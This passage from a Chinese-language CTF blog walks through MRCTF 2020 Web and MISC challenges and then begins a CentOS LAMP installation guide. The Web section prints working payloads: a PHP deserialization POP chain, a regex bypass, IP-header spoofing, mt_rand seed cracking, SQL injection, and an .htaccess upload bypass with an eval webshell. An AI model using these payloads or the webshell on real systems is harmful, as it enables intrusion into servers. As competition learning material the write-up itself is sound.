$this-&gt;p;//5.触发到这里        return $function();//6.()会调用__invoke,我们这里选择Modifier对象    }}if(isset($_GET[&#39;pop&#39;])){    @unserialize($_GET[&#39;pop&#39;]);//1.反序列调用这里}else{    $a=new Show;    highlight_file(__FILE__);}?&gt;</code></pre><p>由exp得到payload</p><pre><code class="php">?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D</code></pre><p>得到base64编码的<code>flag.php</code>源码，解码得到flag</p><h4 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h4><p>这道题比较简单。查看源代码，发现：</p><pre><code class="php">&lt;!--//1st$query = $_SERVER[&#39;QUERY_STRING&#39;]; if( substr_count($query, &#39;_&#39;) !== 0 || substr_count($query, &#39;%5f&#39;) != 0 ){    die(&#39;Y0u are So cutE!&#39;);} if($_GET[&#39;b_u_p_t&#39;] !== &#39;23333&#39; &amp;&amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;b_u_p_t&#39;])){    echo &quot;you are going to the next ~&quot;;}!--&gt;</code></pre><p>1.要求传入<code>b_u_p_t</code>，且<code>_</code>或<code>%5f</code>的个数都要为0<br>百度后发现：在URL中GET请求当输入<code>.</code>或<code>空格</code>或<code>_</code>都会被忽略，所以<code>b_u_p_t</code>即<code>b u p t</code>或<code>b.u.p.t</code><br>2.这个正则的意思是要23333开头和结尾，但值不能是23333。<br>百度后了解到：url的<code>%0a</code>为换行污染，可以绕过这个正则，且值不为23333。<br>放上当时做题截图：<br><img src="http://img-blog.csdnimg.cn/20200410010421551.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后url输入<code>secrettw.php</code>进入下一关。<br>发现jsfuck编码，解码得<code>post me Merak</code>。POST传入<code>Merak=1</code>可查看源码。</p><pre><code class="php">&lt;?php error_reporting(0); include &#39;takeip.php&#39;;ini_set(&#39;open_basedir&#39;,&#39;.&#39;); include &#39;flag.php&#39;;if(isset($_POST[&#39;Merak&#39;])){     highlight_file(__FILE__);     die(); } function change($v){     $v = base64_decode($v);     $re = &#39;&#39;;     for($i=0;$i&lt;strlen($v);$i++){         $re .= chr ( ord ($v[$i]) + $i*2 );     }     return $re; }echo &#39;Local access only!&#39;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#39;127.0.0.1&#39;)echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;if($ip === &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; ){echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);echo file_get_contents(change($_GET[&#39;file&#39;])); }?&gt;</code></pre><p>伪造本地ip，测试发现禁了XFF头，然后我用<code>Client-IP</code>头。<br>又发现<code>file_get_contents</code>里有个自定义的change函数执行解密操作<br>于是我根据源码反向写出加密的exp：</p><pre><code class="php">&lt;?php/*function change($v){     $v = base64_decode($v);     $re = &#39;&#39;;     for($i=0;$i&lt;strlen($v);$i++){         $re .= chr ( ord ($v[$i]) + $i*2 );     }     return $re; }*/function result($re){    $v = &#39;&#39;;    for($i=0;$i&lt;strlen($re);$i++){        $v .=chr(ord($re[$i])-$i*2);    }    $v=base64_encode($v);    return $v;}//echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);echo result($_GET[&#39;s&#39;]);//echo file_get_contents(change($_GET[&#39;file&#39;]));?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20200410011928399.jpg" alt="在这里插入图片描述"><br>得到payload：</p><pre><code class="php">secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</code></pre><p>然后post参数<code>todat is a happy day</code>作为get参数<code>?2333</code>传入的文件内容，最后伪造127.0.0.1提交即可得到flag<br><img src="http://img-blog.csdnimg.cn/20200410013859516.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h4><p>这个题依旧很简单，之前做过安恒新年赛<code>枯燥的抽奖</code>，和这考察的一模一样，都是在考察<code>mt_rand()函数的PHP伪随机性</code>。但当时没有总结，以至于看到题时找了一会儿才找到之前的做法，痛失一血(唯一一次离一血这么近，被我给荒废了，枯了)。现在总结一下这种类型题的做法：<br>大致思路：</p><blockquote><p>1.发现使用mt_rand()函数，并给出生成字符串的一部分<br>2.用py脚本根据字符串的一部分生成随机数<br>3.php_mt_seed根据生成的随机数爆出seed<br>4.根据seed利用php代码生成完整字符串</p></blockquote><p><strong>php伪随机性</strong><br>如果mt_srand使用同一个seed，生成的随机数是可以爆破出seed的<br><a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed</a><br><strong>利用py脚本</strong>：</p><pre><code class="python">str1=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;str2=&#39;KVQP0LdJKRaV3n9D&#39;str3 = str1[::-1]length = len(str2)res=&#39;&#39;for i in range(len(str2)):    for j in range(len(str1)):        if str2[i] == str1[j]:            res+=str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p>运行脚本生成随机数</p><pre><code class="py">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </code></pre><p><strong>利用php_mt_seed</strong><br>我在Kali上使用的。</p><pre><code class="python">./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</code></pre><p><img src="http://img-blog.csdnimg.cn/2020041002375468.jpg" alt="在这里插入图片描述"><br>这里不仅要注意利用php_mt_seed生成的seed，还要注意PHP版本(运用PHP代码根据seed生成完整字符串要用)<br><strong>利用php代码</strong><br><img src="http://img-blog.csdnimg.cn/20200410024227708.jpg" alt="在这里插入图片描述"><br>大致说一下这道题的思路：<br>1.根据目录扫描，发现源码泄露<code>www.zip</code><br>2.打开源码，发现使用mt_rand()生成伪随机数(这里贴一下关键部分)</p><pre><code class="php">// genarate public_key function public_key($length = 16) {    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $public_key = &#39;&#39;;    for ( $i = 0; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);    return $public_key;  }  //genarate private_key  function private_key($length = 12) {    $strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $private_key = &#39;&#39;;    for ( $i = 0; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);    return $private_key;  }  $Public_key = public_key();  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code></pre><p>3.根据一部分Public_key-&gt;生成随机数-&gt;爆出种子&gt;生成完整字符串<br>4.输入用户名crispr+密码进行SQL注入<code>&#39; or 1=1#</code>+输入完整字符串得到flag</p><h4 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h4><p>这个题，依旧很容易。不过当时忘了截图了，再做一遍：<br>1.通过MIME绕过后端文件类型限制，即修改<code>Content-Type: image/jpg</code><br>然后构造<code>.htaccess</code>，实现重写文件解析。<code>.htaccess</code>文件内容为：</p><pre><code class="php">&lt;FilesMatch &quot;webshell&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>先上传<code>.htaccess</code>，再上传<code>webshell.jpg</code>，然后webshell.jpg就当php解析了。<br>webshell可为图片马，也可以只有下面内容：</p><pre><code class="php">&lt;?php @eval($_POST[1]); ?&gt;</code></pre><p>上传成功，菜刀或蚁剑一连。在根目录下找到flag<br><img src="http://img-blog.csdnimg.cn/20200410032413433.jpg" alt="在这里插入图片描述"></p><p>Web还有两道题，一道依旧是pop链，另一道是多种手段动调+静态调试Web Assembly。<br>pop链还没咋学，而这道pop链的题似乎看起来稍微难点，等学过后再总结。<br>另一道题没听说过，有时间的话了解一下。。<br>文末有官方wp参考链接</p><h3 id="0x02-MISC"><a href="#0x02-MISC" class="headerlink" title="0x02 MISC"></a>0x02 MISC</h3><h4 id="不眠之夜"><a href="#不眠之夜" class="headerlink" title="不眠之夜"></a>不眠之夜</h4><p><img src="http://img-blog.csdnimg.cn/20200405234729378.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一看到这个拼图，我就放弃拼了。以为需要一个一个拼，看了wp发现原来有工具。总结一下解法<br><strong>解法1：手动拼图</strong><br>这个就手工拼就好了。。。。。可以放ppt里拼<br><strong>解法2：写脚本+手拼</strong><br>我不会写，直接拿来大师傅写的脚本：</p><blockquote><p>用下面两个脚本把纵向的大概拼一下，然后剩的为数不多的几张图再手动拼。</p></blockquote><pre><code class="python">import osfrom PIL import Images=[]for i in os.listdir(&#39;ini&#39;):    if i[-4:]==&#39;.jpg&#39;:        s.append(Image.open(open(&#39;ini/&#39;+i,&#39;rb&#39;)))for i in s:    assert i.size[0]==200 and i.size[1]==100print(len(s))def dis(a,b):    r=0    for i in range(3):        if a[i]&gt;50 or b[i]&gt;50:            r+=(a[i]-b[i])**2        else:            r+=1000    return rdef matchx(a,b):    s=0    for i in range(200):        s+=dis(a.getpixel((i,99)),b.getpixel((i,0)))    return st=[]for i in range(len(s)):    for j in range(len(s)):        if i==j:continue        t.append((matchx(s[i],s[j]),i,j))t.sort()rs=&#39;&#39;for i in t:    rs+=&#39;%d %d %d\n&#39;%iopen(&#39;out.txt&#39;,&#39;w&#39;).write(rs)</code></pre><pre><code class="python">import osfrom PIL import Imageim=Image.open(&#39;ini/00fd5b9.jpg&#39;)fn=[]for i in os.listdir(&#39;ini&#39;):    if i[-4:]==&#39;.jpg&#39;:        fn.append(&#39;ini/&#39;+i)s=[]for i in open(&#39;out.txt&#39;).readlines():    v=i.split()    if len(v)==3:        s.append(tuple(map(int,v)))nxt=[-1]*120pre=[-1]*120rem=120for v,a,b in s:    if nxt[a]==-1 and pre[b]==-1:        nxt[a]=b        pre[b]=a        rem-=1        if rem==10:            breakfor i in range(120):    if pre[i]==-1:        t=[]        x=i        while x!=-1:            t.append(fn[x])            x=nxt[x]        print(len(t))        imt=im.resize((200,100*len(t)))        cnt=0        for j in t:            imv=Image.open(j)            imt.paste(imv,(0,100*cnt,200,100*(cnt+1)))            cnt+=1        imt.save(&#39;outi/%d.png&#39;%i)</code></pre><p>先建两个文件夹ini和outi。ini里放图片碎片，outi是脚本最后生成的图片。这道题，注意删除一张不是图片碎片的jpg文件。然后执行脚本，最后把outi里的图片再大致手拼一下就好了<br><img src="http://img-blog.csdnimg.cn/20200406233026938.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>解法3：gayhub上的gaps工具</strong><br>使用gaps工具是最好的方法。<br>具体安装及使用流程：<br>（1） ImageMagick安装</p><pre><code class="shell">apt-get install libjpeg*apt-get install libpng*apt-get install libtiff*apt-get install libungif*apt-get install freetype*apt-get install zlib*#下载：http://www.imagemagick.org/download/ImageMagick-7.0.10-5.tar.gztar zxvf ImageMagick-7.0.10-5.tar.gzcd ImageMagick-7.0.10-5./configure &amp;&amp; make &amp;&amp; make install#测试：convert 1.jpg 1.png  没报错并成功转换就是安装成功</code></pre><p>（2）gaps安装</p><pre><code class="shell">git clone http://github.com/nemanja-m/gaps.gitcd gaps  pip install -r requirements.txt #如果爆模块安装过的错误，直接在txt文件列表删掉该模块即可sudo apt-get install python-tkpip install -e .</code></pre><p>执行下面命令，完成拼图：</p><pre><code class="shell">montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpg #把图片碎片合成一个图片# 将目录中的jpg文件按顺序拼成x轴10块，y轴12块，每个图块大小为200x100像素，输出文件为out.jpggaps --image=out.jpg --generations=50 --population=120 --size=100 #还原原图片--image           指向拼图的路径--size            拼图块的像素尺寸--generations     遗传算法的代的数量--population      个体数量--verbose         每一代训练结束后展示最佳结果--save            将拼图还原为图像</code></pre><p><img src="http://img-blog.csdnimg.cn/2020040700075028.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考MISC大师傅博客：<a href="http://www.ga1axy.top/" target="_blank" rel="noopener">ga1@xy</a></p><h4 id="Unravel"><a href="#Unravel" class="headerlink" title="Unravel"></a>Unravel</h4><p>1.binwalk分离图片发现带有aes的Tokyo<br>2.然后查看.wav文件尾，发现密文(也可以先发现这个密文，Base64解出Salted，“加盐”，想到找密钥)<br>3.利用密码解密的得到<code>Ending.wav</code><br>4.通过<strong>silenteye</strong>解LSB隐写得到flag</p><h4 id="pyflag"><a href="#pyflag" class="headerlink" title="pyflag"></a>pyflag</h4><p>这个题也大致总结下思路：<br>1.使用winhex或strings命令发现文件末尾隐藏信息<br>2.<code>strings</code>会发现[Secret File Part 1-3]的标识<br>3.16进制打开则发现文件尾的结束符并非jpg的标准结束符<code>FF D9</code><br>4.将三段隐藏信息复制到winhex中，得到一个压缩包<br>5.暴力破解得到弱密码：1234<br><img src="http://img-blog.csdnimg.cn/20200409221404749.jpg" alt="在这里插入图片描述"><br>6.得到一个flag.txt和.hint.txt。提示0x10,0x20,0x30,0x55。即base16,32,64,85编码。<br>7.写脚本解码即可，由于之前写过一个脚本，直接使用即可。(这里就不贴出源码了)<br>自己可参考：<a href="http://www.wishingstarmoye.com/tools/base64" target="_blank" rel="noopener">http://www.wishingstarmoye.com/tools/base64</a><br><img src="http://img-blog.csdnimg.cn/20200409225613388.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h4><p><strong>1.自动化解压zip</strong><br>尝试发现zip的解压密码是文件名字，可以写脚本。这种脚本之前BJD已经见过，看wp写的python2的脚本，算了，不想用。我直接把BJD那个脚本改一下(发现脚本其实特别简单，当时我以为脚本很难。还是自己写脚本用着香啊。。。)：</p><pre><code class="python">import osimport filetypeimport timewhile 1:    files = os.popen(&#39;ls&#39;)    filename = files.read().replace(&#39;1.py&#39;,&#39;&#39;).replace(&#39;\n&#39;, &#39;&#39;)    password = filename.replace(&#39;.zip&#39;, &#39;&#39;)    kind = filetype.guess(filename) #返回文件类型对象    if kind.extension is &#39;zip&#39;: #支持类型，kind.extension 后缀，kind.mime MIME类型        os.system(&quot;unzip -P {} {}.zip&quot;.format(password, password))        #unzip -P a a.zip        os.system(&quot;rm &quot;+password+&quot;.zip&quot;)        time.sleep(0.1)    else:        print(&#39;解压完成&#39;)        break</code></pre><p><strong>2.像素点画图</strong><br>这个用过gnuplot利用坐标画过图，这里是利用像素点画图，直接用脚本(这个也挺容易写)：<br>可以参考：<a href="https://blog.csdn.net/FlashKoala/article/details/90649464" target="_blank" rel="noopener">PIL模块使用</a></p><pre><code class="python">from PIL import Imagex = 200    #x坐标  通过对txt里的行数进行整数分y = 200    #y坐标  x * y = 行数im = Image.new(&quot;RGB&quot;, (x, y))file = open(&#39;qr.txt&#39;)for i in range(0, x):    for j in range(0, y):        line = file.readline()  #获取一行的rgb值        line = line[:-2]        line = line[1:]        #print(line)        rgb = line.split(&quot;, &quot;)  #分离rgb，文本中逗号后面有空格        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))im.save(&#39;flag.png&#39;)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200407015745867.jpg" alt="在这里插入图片描述"><br>得到一张二位码，扫描得到flag</p><h4 id="你能看懂音符吗"><a href="#你能看懂音符吗" class="headerlink" title="你能看懂音符吗"></a>你能看懂音符吗</h4><p>复现后，这里只写一下思路：<br>1.修复文件头<code>6152</code>改为<code>5261</code><br>2.word隐写，即显示隐藏文字(之前已了解过，<a href="http://blog.csdn.net/q_l_s/article/details/53813971" target="_blank" rel="noopener">Word文字的三种隐藏方法</a>)<br>3.解密音符(这个之前没见过，不过千千秀字上有<a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">文本加密为音乐符号在线解密</a>)<br><img src="http://img-blog.csdnimg.cn/20200409231841855.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="寻找xxx"><a href="#寻找xxx" class="headerlink" title="寻找xxx"></a>寻找xxx</h4><p>就是个简单的拨号音隐写(dtmf)。跑脚本的话，我跑出的结果错了几位，只好一个一个的听了，参考<a href="http://www.bilibili.com/video/BV1ap411R7Cj?t=159" target="_blank" rel="noopener">通过按键音判断输入的数字</a>。<br>或者通过拨号音的信号频率判断，这个可以使用Au。<br><img src="http://img-blog.csdnimg.cn/20200410131233790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当然这类题有的也可以直接用<a href="https://github.com/hfeeki/dtmf/blob/master/dtmf-decoder.py" target="_blank" rel="noopener">dtmf-decoder脚本</a>或<a href="https://github.com/pjasiun/dtmf-decoder/tree/master/bin" target="_blank" rel="noopener">DTMF decoder安卓app</a>或工具dtmf2num</p><h3 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h3><p>通过这次做题，我了解到(或简单总结)了<code>一些bypass</code>、<code>初识了POP链</code>、<code>mt_rand()函数的PHP伪随机性</code>、<code>拼图脚本及工具的使用</code>、<code>音频的LSB隐写</code>、<code>Base家族的其他成员</code>、<code>文件名为密码解压压缩包脚本的编写</code>、<code>利用PIL库和py脚本进行像素点画图</code>、<code>音乐符号解密</code>、<code>拨号音隐写</code>。好了，大概就那么多，继续加油！！</p><p>官方wp：<a href="https://github.com/BuptMerak/mrctf2020-writeups/tree/master/official#base64-wrapper-lfi" target="_blank" rel="noopener">MRCTF新生赛 2020</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos之源码安装LAMP服务器</title>
      <link href="/2020/04/08/Centos%E4%B9%8B%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85LAMP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/04/08/Centos%E4%B9%8B%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85LAMP%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>上个周三在Linux课上，让搭建LAMP环境，当时没搭好。周末搭的时候遇到一个百度搜不到的报错，整了一天也没解决。而在昨天晚上我成功解决了那个报错<br>(原因是zlib库安装问题。不说了，我太菜了)。<br>于是今天把LAMP完整的搭好了。并记录了下搭建过程：</p><h3 id="1、准备环境"><a href="#1、准备环境" class="headerlink" title="1、准备环境"></a>1、准备环境</h3><p><strong>1.概述</strong><br>L：Linux 提供底层操作系统平台<br>A：Apache 提供一个浏览器的支持<br>M：MySQL 提供数据库支持<br>P：PHP/Perl/Python 提供人性化显示</p><p>安装顺序：Linux-&gt;Apache-&gt;MySQL-&gt;PHP<br><strong>2.环境</strong><br>（1）安装编译工具gcc、gcc-c++<br>（2）关闭系统RPM安装包的Apache、MySQL的服务<br>（3）关闭SELinux、防火墙<br>（4）关闭不必要的服务<br>（5）拷贝源码包，通过脚本批量安装<br>（6）确认磁盘空间未满<br><strong>源码安装</strong><br><img src="http://img-blog.csdnimg.cn/20200401144805344.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>eject弹出光盘</p><h3 id="2、环境安装"><a href="#2、环境安装" class="headerlink" title="2、环境安装"></a>2、环境安装</h3><p>镜像包：<a href>LAMP.iso</a><br>1.连接lamp源码包镜像<code>LAMP.iso</code>。将<code>lamp-php5.4</code>复制到<code>/usr/src/lamp</code></p><pre><code class="shell">cp -rf /run/media/root/20150430_144909/lamp-php5.4 /usr/src/lamp</code></pre><p><img src="http://img-blog.csdnimg.cn/20200407234248907.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200407234200815.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.挂载Centos系统镜像到<code>/media</code></p><pre><code class="shell">mount /dev/cdrom /media</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401151258973.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.安装编译工具gcc</p><pre><code class="shell">yum -y install gcc*</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401151319660.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.关闭系统RPM安装包的Apache、MySQL的服务<br><img src="http://img-blog.csdnimg.cn/20200401151443133.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>系统没有安装Apache、MySQL的服务。<br>如果安装了的话，使用<code>service 服务名 stop</code> 关闭服务<br>如果设置开机不启用<code>chkconfig httpd off</code><br>5.关闭SELinux、防火墙</p><pre><code class="shell">iptables -F #清空防火墙所有内容vi /etc/selinux/configsetenforce 0 #临时状态设为不启用</code></pre><p><img src="http://img-blog.csdnimg.cn/20200407234809698.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200401152502478.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.关闭不需要的服务<br>7.脚本批量安装</p><pre><code class="shell">cd /usr/src/lamp</code></pre><pre><code class="shell">#!/bin/bash/bin/ls *.tar.gz &gt;ls.list/bin/ls *.tgz &gt;&gt; ls.listfor a in `cat ls.list`do    /bin/tar -zxf $adonerm -rf ls.list</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401153436923.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200401153506471.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>8.确认磁盘空间<br><code>df -h</code><br><strong>注意</strong>：<br>目录名不要改<br>顺序不要改</p><h3 id="3、安装一些软件包"><a href="#3、安装一些软件包" class="headerlink" title="3、安装一些软件包"></a>3、安装一些软件包</h3><h4 id="1-安装python底层环境"><a href="#1-安装python底层环境" class="headerlink" title="1.安装python底层环境"></a>1.安装python底层环境</h4><pre><code class="shell">yum -y install python-devel</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401154132552.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2-安装libxml2-解释器"><a href="#2-安装libxml2-解释器" class="headerlink" title="2.安装libxml2 解释器"></a>2.安装libxml2 解释器</h4><p>启用对其他语言的支持</p><pre><code class="shell">cd /usr/src/lamp/libxml2-2.9.1/./configure --prefix=/usr/local/libxml2/makemake install</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401154417463.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200401154425760.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200401154612964.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="3-安装libmcrypt"><a href="#3-安装libmcrypt" class="headerlink" title="3.安装libmcrypt"></a>3.安装libmcrypt</h4><p>提供加密算法</p><pre><code class="shell">cd /usr/src/lamp/libmcrypt-2.5.8/./configure --prefix=/usr/local/libmcrypt/makemake install</code></pre><h4 id="4-安装mhash"><a href="#4-安装mhash" class="headerlink" title="4.安装mhash"></a>4.安装mhash</h4><p>提供加密方式的扩展<br>先安装libltdl</p><pre><code class="shell">cd /usr/src/lamp/libmcrypt-2.5.8/libltdl/./configure --enable-ltdl-install #启用安装makemake install</code></pre><p>然后安装mhash</p><pre><code class="shell">cd /usr/src/lamp/mhash-0.9.9.9/./configuremakemake install</code></pre><h4 id="5-安装mcrypt"><a href="#5-安装mcrypt" class="headerlink" title="5.安装mcrypt"></a>5.安装mcrypt</h4><p>提供php相关的加密支持扩展</p><pre><code class="shell">cd /usr/src/lamp/mcrypt-2.6.8LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \./configure --with-libmcrypt-prefix=/usr/local/libmcryptmakemake install</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401160638880.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="6-安装zlib"><a href="#6-安装zlib" class="headerlink" title="6.安装zlib"></a>6.安装zlib</h4><p>提供压缩用途的函数库<br>按照视频里的方法，没安装成功，于是修改了点</p><pre><code class="shell">cd /usr/src/lamp/zlib-1.2.3/./configure --prefix=/usr/local/zlib/makemake installexport LDFLAGS=&quot;-L /usr/local/zlib/lib&quot;export CPPFLAGS=&quot;-I /usr/local/zlib/include&quot;</code></pre><h4 id="7-安装libpng"><a href="#7-安装libpng" class="headerlink" title="7.安装libpng"></a>7.安装libpng</h4><p>提供png格式的图片的库</p><pre><code class="shell">cd /usr/src/lamp/libpng-1.2.31/./configure --prefix=/usr/local/libpngmakemake install</code></pre><p>执行make发现<br><img src="http://img-blog.csdnimg.cn/20200408022557683.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载<code>zlib-devel</code>，然后重新执行make命令，成功了。</p><pre><code class="shell">yum install zlib-devel</code></pre><p><img src="http://img-blog.csdnimg.cn/20200408022926178.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="8-安装jpeg6"><a href="#8-安装jpeg6" class="headerlink" title="8.安装jpeg6"></a>8.安装jpeg6</h4><p>提供jpeg格式的图片的库</p><pre><code class="shell">mkdir /usr/local/jpeg6mkdir /usr/local/jpeg6/binmkdir /usr/local/jpeg6/libmkdir /usr/local/jpeg6/includemkdir -p /usr/local/jpeg6/man/man1yum -y install libtoolcd /usr/src/lamp/jpeg-6b/cp /usr/share/libtool/config/config.sub .cp /usr/share/libtool/config/config.guess ../configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-staticmakemake install</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401162211724.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img 